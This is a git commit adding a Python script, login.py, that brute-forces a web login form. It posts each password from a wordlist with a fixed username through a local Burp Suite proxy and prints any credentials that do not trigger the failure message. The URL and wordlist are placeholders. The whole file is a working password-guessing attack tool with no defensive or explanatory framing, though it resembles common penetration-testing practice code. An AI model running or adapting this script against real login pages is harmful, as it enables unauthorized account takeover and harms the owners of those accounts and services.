419cbe3128e7bdc0d2e7d9d11a26cde3a23d8021
Mauritz <mauritz.sjodin3@gmail.com>
2020-12-15 20:34:46 +0100

    initial commit

---
+++ login.py
@@ -0,0 +1,35 @@
+import requests
+
+ip = "login form url"
+wordlist = "{path to wordlist}"
+
+login_fail_message = "message that appears when login fails"
+
+# to intercept requests with burp suite
+proxy = {'http' : '127.0.0.1:8080' }
+
+
+def login(username, password):
+    creds = {
+            'username' : username,
+            'pass' : password,
+            }
+    
+    r = requests.post(ip, data=creds, proxies=proxy)
+
+    if login_fail_message in r.text:
+        pass
+    else:
+        print("\nCredentials found!")
+        print(f"{username}:{password}")
+        return True
+
+wordlist = open(wordlist, encoding='latin-1').readlines()
+
+line = 0
+for password in wordlist:
+    if line % 500 == 0:
+        print(f"Tried {line} lines")
+    line += 1
+    if login("username", password.strip()) == True:
+        break
